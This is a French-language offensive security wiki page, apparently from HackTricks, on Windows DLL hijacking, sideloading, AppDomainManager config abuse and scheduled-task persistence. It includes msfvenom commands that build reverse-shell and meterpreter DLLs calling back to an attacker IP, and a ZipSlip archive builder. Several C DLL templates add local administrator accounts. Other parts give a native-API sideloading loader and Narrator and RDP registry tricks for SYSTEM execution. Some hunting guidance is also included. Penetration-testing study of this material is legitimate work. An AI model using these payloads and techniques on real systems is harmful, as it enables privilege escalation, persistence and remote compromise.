# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking consiste à manipuler une application de confiance pour qu’elle charge une DLL malveillante. Ce terme englobe plusieurs techniques comme **DLL Spoofing, Injection, et Side-Loading**. Il est principalement utilisé pour l’exécution de code, obtenir une persistance, et, plus rarement, l’élévation de privilèges. Malgré l’accent mis ici sur l’élévation, la méthode de hijacking reste la même quel que soit l’objectif.

### Common Techniques

Plusieurs méthodes sont employées pour DLL hijacking, chacune avec son efficacité selon la stratégie de chargement des DLL de l’application :

1. **DLL Replacement** : Remplacer une DLL légitime par une malveillante, éventuellement en utilisant DLL Proxying pour conserver la fonctionnalité de la DLL d’origine.
2. **DLL Search Order Hijacking** : Placer la DLL malveillante dans un chemin de recherche avant la légitime, en exploitant le schéma de recherche de l’application.
3. **Phantom DLL Hijacking** : Créer une DLL malveillante pour qu’une application la charge, en pensant qu’il s’agit d’une DLL requise inexistante.
4. **DLL Redirection** : Modifier des paramètres de recherche comme `%PATH%` ou des fichiers `.exe.manifest` / `.exe.local` pour diriger l’application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : Remplacer la DLL légitime par une copie malveillante dans le répertoire WinSxS, une méthode souvent associée à DLL side-loading.
6. **Relative Path DLL Hijacking** : Placer la DLL malveillante dans un répertoire contrôlé par l’utilisateur avec l’application copiée, ce qui ressemble aux techniques de Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Le classic DLL sideloading n’est pas la seule façon de faire charger du code attaquant par un processus **.NET Framework** de confiance. Si l’exécutable cible est une application **managed**, le CLR consulte aussi un **application configuration file** nommé d’après l’exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si le config pointe vers un assembly contrôlé par l’attaquant placé à côté du EXE, le CLR le charge **avant le chemin normal du code de l’application** et l’exécute dans le processus de confiance.

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le manager personnalisé soit utilisé.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestionnaire minimal :
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notes pratiques :
- C’est du **tradecraft spécifique à .NET Framework**. Cela dépend de l’analyse de la config CLR, pas de l’ordre de recherche des DLL Win32.
- L’hôte doit vraiment être un **managed EXE**. Vérification rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou chercher le **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de config doit correspondre exactement au nom de l’exécutable (`<binary>.config`) et se trouve généralement **à côté du EXE**.
- C’est utile avec des **signed Microsoft/vendor binaries** parce que le EXE de confiance reste inchangé tandis que l’assembly managed malveillant s’exécute dans le processus.
- Si tu as déjà un répertoire d’install/update inscriptible, AppDomainManager hijacking peut servir de **première étape**, suivi de classic DLL sideloading ou reflective loading pour les étapes suivantes.

### Hijacking d’une tâche planifiée existante pour relancer la chaîne de sideload

Pour la persistence, ne te limite pas à **créer une nouvelle tâche**. Certains intrusion sets attendent qu’un installateur légitime crée une **tâche d’update normale**, puis **réécrivent l’action de la tâche** afin que le nom existant, l’auteur et le trigger restent familiers aux défenseurs.

Workflow réutilisable :
1. Installe/exécute le logiciel légitime et identifie la tâche qu’il crée normalement.
2. Exporte le XML de la tâche et note les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.
3. Remplace uniquement l’action pour que la tâche lance ton **trusted host EXE** depuis un répertoire de staging inscriptible par l’utilisateur, qui ensuite side-load ou AppDomain-load le vrai payload.
4. Réenregistre le même nom de tâche au lieu de créer un nouvel artefact de persistence évident.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Pourquoi c’est plus furtif :
- Le nom de la tâche peut toujours sembler légitime (par exemple un updater de vendor).
- Le **Task Scheduler service** la lance, donc la validation parent/ancestor voit souvent la chaîne de planification attendue au lieu de `explorer.exe`.
- Les équipes DFIR qui ne traquent que les **nouveaux noms de tâche** peuvent manquer une tâche dont l’enregistrement existait déjà, mais dont l’action pointe maintenant vers `%LOCALAPPDATA%`, `%APPDATA%`, ou un autre chemin contrôlé par l’attaquant.

Pivots de hunting rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparer les métadonnées XML de `C:\Windows\System32\Tasks\*` et `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` avec une baseline.
- Alerter quand une **vendor-looking updater task** s’exécute depuis des **user-writable directories** ou lance un EXE .NET avec un fichier `*.config` co-localisé.

> [!TIP]
> Pour une chaîne étape par étape qui superpose du HTML staging, des configs AES-CTR, et des implants .NET au-dessus du DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La manière la plus courante de trouver des Dlls manquants dans un système est d’exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) depuis sysinternals, **en configurant** les **2 filtres suivants** :

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

et en affichant seulement l’**activité du File System** :

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Si vous cherchez des **missing dlls en général**, laissez ceci tourner pendant quelques **secondes**.\
Si vous cherchez une **missing dll dans un exécutable spécifique**, vous devez configurer **un autre filtre comme "Process Name" "contains" `<exec name>`, l’exécuter, puis arrêter la capture des événements**.

## Exploiting Missing Dlls

Afin d’escalader les privilèges, la meilleure chance que nous ayons est de pouvoir **écrire une dll qu’un processus privilégié essaiera de charger** dans un **emplacement où elle va être recherchée**. Ainsi, nous pourrons **écrire** une dll dans un **dossier** où la **dll est recherchée avant** le dossier où se trouve la **dll originale** (cas étrange), ou bien nous pourrons **écrire dans un dossier où la dll va être recherchée** et où la dll originale **n’existe pas** dans un quelconque dossier.

### Dll Search Order

**Dans la** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez voir comment les Dlls sont chargées précisément.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins de recherche prédéfinis**, selon une séquence précise. Le problème du DLL hijacking apparaît lorsqu’une DLL malveillante est placée de manière stratégique dans l’un de ces répertoires, garantissant qu’elle sera chargée avant la DLL authentique. Une solution pour éviter cela est de faire en sorte que l’application utilise des chemins absolus lorsqu’elle fait référence aux DLL dont elle a besoin.

Vous pouvez voir ci-dessous l’**ordre de recherche des DLL sur les systèmes 32-bit** :

1. Le répertoire depuis lequel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16-bit. Il n’existe pas de fonction pour obtenir le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires listés dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin par application défini par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée lors du calcul du chemin de recherche des DLL.

C’est l’ordre de recherche **par défaut** avec **SafeDllSearchMode** activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la à 0 (activé par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu’**une dll peut être chargée en indiquant le chemin absolu au lieu du simple nom**. Dans ce cas, cette dll **ne sera recherchée que dans ce chemin** (si la dll a des dépendances, elles seront recherchées comme si elles avaient été chargées par nom).

Il existe d’autres moyens de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Utilisez des filtres **ProcMon** (`Process Name` = target EXE, `Path` se termine par `.dll`, `Result` = `NAME NOT FOUND`) pour collecter les noms de DLL que le processus cherche mais ne trouve pas.
2. Si le binaire s’exécute via une **schedule/service**, déposer une DLL portant l’un de ces noms dans le **répertoire de l’application** (entrée #1 de l’ordre de recherche) la fera charger au prochain lancement. Dans un cas de scanner .NET, le processus a cherché `hostfxr.dll` dans `C:\samples\app\` avant de charger la vraie copie depuis `C:\Program Files\dotnet\fxr\...`.
3. Construisez une DLL payload (par ex. reverse shell) avec n’importe quel export : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est un **ZipSlip-style arbitrary write**, fabriquez un ZIP dont l’entrée sort du répertoire d’extraction afin que la DLL atterrisse dans le dossier de l’application :
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Livrez l'archive à la boîte de réception/share surveillée ; lorsque la tâche planifiée relance le processus, il charge la DLL malveillante et exécute votre code en tant que compte de service.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de manière déterministe le chemin de recherche des DLL d'un processus nouvellement créé consiste à définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En fournissant ici un répertoire contrôlé par l'attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les flags de chargement sûr) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemple d'utilisation opérationnelle
- Placez un xmllite.dll malveillant (exportant les fonctions requises ou faisant du proxy vers le vrai) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom en utilisant la technique ci-dessus. Le loader résout l'import via le DllPath fourni et charge en sideloading votre DLL.

Cette technique a été observée in-the-wild comme moteur de chaînes de sideloading multi-étapes : un launcher initial dépose une DLL helper, qui lance ensuite un binaire signé par Microsoft, hijackable, avec un DllPath personnalisé pour forcer le chargement de la DLL de l'attaquant depuis un répertoire de staging.


### .NET AppDomainManager hijacking via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut être effectué **avant `Main()`** sans patcher la mémoire en abusant du fichier adjacent **`.exe.config`** de l'application. Au lieu de dépendre uniquement de l'ordre de recherche DLL Win32, l'attaquant place un EXE .NET légitime à côté d'une config malveillante et d'un ou plusieurs assemblies contrôlés par l'attaquant.

Comment fonctionne la chaîne :
1. L'EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. La config définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`** afin que le runtime instancie un `AppDomainManager` contrôlé par l'attaquant.
3. Le manager malveillant obtient une exécution **pré-`Main()`** dans le processus hôte de confiance.
4. La même config peut forcer le CLR à résoudre d'abord les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et peut affaiblir la validation/runtime telemetry sans patching inline.

Pattern de campagne (l'imbrication exacte peut varier selon la directive / la version du CLR) :
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Pourquoi c’est utile :
- **`<probing privatePath="."/>`** maintient la résolution des assemblies dans le répertoire de l’application, transformant le dossier en surface de sideloading prévisible.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** déplacent l’exécution vers le code de l’attaquant pendant l’initialisation du CLR, avant l’exécution de la logique légitime de l’application.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une app en full-trust de charger des assemblies non signés ou altérés sans échec de validation strong-name.
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher-policy vers des assemblies plus récentes.
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant car le **CLR désactive sa propre visibilité ETW** depuis la configuration au lieu que l’implant patch `EtwEventWrite` en mémoire.

Schéma opérationnel observé dans des campagnes récentes :
- La phase 1 dépose `setup.exe`, `setup.exe.config`, et des assemblies locaux.
- La phase 2 les copie dans un dossier **AppData update** crédible, renomme l’hôte en quelque chose comme `update.exe`, puis le relance via une **scheduled task**.
- La phase 3 vérifie le contexte d’exécution (par exemple le parent attendu `svchost.exe` depuis Task Scheduler) avant de charger le DLL/export final du RAT.

Idées de hunting :
- Des **exécutables .NET** signés ou autrement légitimes exécutés avec des fichiers **`.config`** suspects adjacents dans des emplacements inscriptibles par l’utilisateur.
- Des fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, ou **`etwEnable enabled="false"`**.
- Des scheduled tasks qui relancent des binaires update renommés depuis **`%LOCALAPPDATA%`** ou des répertoires spécifiques à l’application `\bin\update\`.
- Des chaînes parent/enfant où une scheduled task lance un hôte .NET de confiance qui charge immédiatement des assemblies non-vendor depuis son propre répertoire.

#### Exceptions on dll search order from Windows docs

Certaines exceptions à l’ordre standard de recherche des DLL sont mentionnées dans la documentation Windows :

- Lorsqu’une **DLL qui partage son nom avec une autre déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. À la place, il effectue une vérification de redirection et un manifest avant de retomber sur la DLL déjà en mémoire. **Dans ce scénario, le système n’effectue pas de recherche pour la DLL**.
- Dans les cas où la DLL est reconnue comme une **known DLL** pour la version actuelle de Windows, le système utilisera sa version de la known DLL, ainsi que ses DLL dépendantes, **en renonçant au processus de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient la liste de ces known DLLs.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes est effectuée comme si elles n’étaient indiquées que par leurs **noms de module**, que la DLL initiale ait été identifiée via un chemin complet ou non.

### Escalating Privileges

**Requirements** :

- Identifier un processus qui s’exécute ou s’exécutera avec **des privilèges différents** (mouvement horizontal ou latéral), et qui **manque d’une DLL**.
- S’assurer qu’un **accès en écriture** est उपलब्धible pour tout **répertoire** dans lequel la **DLL** sera **recherchée**. Cet emplacement peut être le répertoire de l’exécutable ou un répertoire dans le system path.

Oui, les prérequis sont compliqués à trouver, car **par défaut c’est assez étrange de trouver un exécutable privilégié auquel il manque une dll** et c’est encore **plus étrange d’avoir des permissions d’écriture sur un dossier du system path** (ce n’est pas le cas par défaut). Mais, dans des environnements mal configurés, c’est possible.\
Si vous avez de la chance et que vous remplissez les conditions, vous pouvez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si **l’objectif principal du projet est de bypass UAC**, vous y trouverez peut-être un **PoC** de Dll hijaking pour la version de Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des permissions d’écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les imports d’un exécutable et les exports d’un dll avec :
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur comment **abuse Dll Hijacking to escalate privileges** avec les permissions d’écrire dans un dossier **System Path**, consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)va vérifier si vous avez des permissions d’écriture sur un dossier à l’intérieur du system PATH.\
D’autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les fonctions **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l’une des choses les plus importantes pour réussir à l’exploiter serait de **créer un dll qui exporte au moins toutes les fonctions que l’exécutable importera depuis lui**. Quoi qu’il en soit, notez que Dll Hijacking est utile pour [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **how to create a valid dll** dans cette étude sur dll hijacking axée sur l’exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **next sectio**n vous pouvez trouver du **basic dll codes** qui peuvent être utiles comme **templates** ou pour créer un **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

En gros, un **Dll proxy** est un Dll capable d’**execute your malicious code when loaded** mais aussi d’**expose** et de **work** comme **expected** en **relayant tous les appels vers la vraie bibliothèque**.

Avec l’outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous voulez proxifier et **generate a proxified dll** ou **indiquer le Dll** et **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenir un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86 je n’ai pas vu de version x64) :**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre

Notez que dans plusieurs cas, le Dll que vous compilez doit **exporter plusieurs fonctions** qui vont être chargées par le processus victime, si ces fonctions n’existent pas le **binaire ne pourra pas les charger** et **l’exploit échouera**.

<details>
<summary>Modèle de DLL C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemple de DLL C++ avec création d’utilisateur</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternatif avec thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Étude de cas : Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe interroge toujours au démarrage une DLL de localisation spécifique à la langue et prévisible, qui peut être hijackée pour l’exécution de code arbitraire et la persistance.

Faits clés
- Chemin de probe (versions actuelles) : `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ancien chemin (anciennes versions) : `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si une DLL attaquante inscriptible existe sur le chemin OneCore, elle est chargée et `DllMain(DLL_PROCESS_ATTACH)` s’exécute. Aucun export n’est requis.

Découverte avec Procmon
- Filtre : `Process Name is Narrator.exe` et `Operation is Load Image` ou `CreateFile`.
- Démarrez Narrator et observez la tentative de chargement du chemin ci-dessus.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silence OPSEC
- Un détournement naïf fera parler/mettra en surbrillance l'UI. Pour rester discret, lors de l'attache, énumérez les threads de Narrator, ouvrez le thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) et faites-lui un `SuspendThread`; continuez dans votre propre thread. Voir le PoC pour le code complet.

Déclenchement et persistence via Accessibility configuration
- Contexte utilisateur (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Avec ce qui précède, le lancement de Narrator charge la DLL déposée. Sur le secure desktop (écran de logon), appuyez sur CTRL+WIN+ENTER pour démarrer Narrator; votre DLL s'exécute en tant que SYSTEM sur le secure desktop.

Exécution SYSTEM déclenchée par RDP (lateral movement)
- Autorisez la couche de sécurité RDP classique: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP vers l'hôte, à l'écran de logon appuyez sur CTRL+WIN+ENTER pour lancer Narrator; votre DLL s'exécute en tant que SYSTEM sur le secure desktop.
- L'exécution s'arrête lorsque la session RDP se ferme—injectez/migrez rapidement.

Bring Your Own Accessibility (BYOA)
- Vous pouvez cloner une entrée de registre d'un Accessibility Tool (AT) intégré (par exemple, CursorIndicator), la modifier pour pointer vers un binaire/DLL arbitraire, l'importer, puis définir `configuration` sur ce nom d'AT. Cela proxifie l'exécution arbitraire sous le framework Accessibility.

Notes
- L'écriture sous `%windir%\System32` et la modification des valeurs HKLM nécessitent des droits admin.
- Toute la logique du payload peut vivre dans `DLL_PROCESS_ATTACH`; aucun export n'est nécessaire.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. En tant qu'utilisateur standard, déposez `hostfxr.dll` dans `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendez que la tâche planifiée s'exécute à 9:30 AM sous le contexte de l'utilisateur courant.
3. Si un administrateur est connecté lorsque la tâche s'exécute, la DLL malveillante s'exécute dans la session de l'administrateur avec une intégrité moyenne.
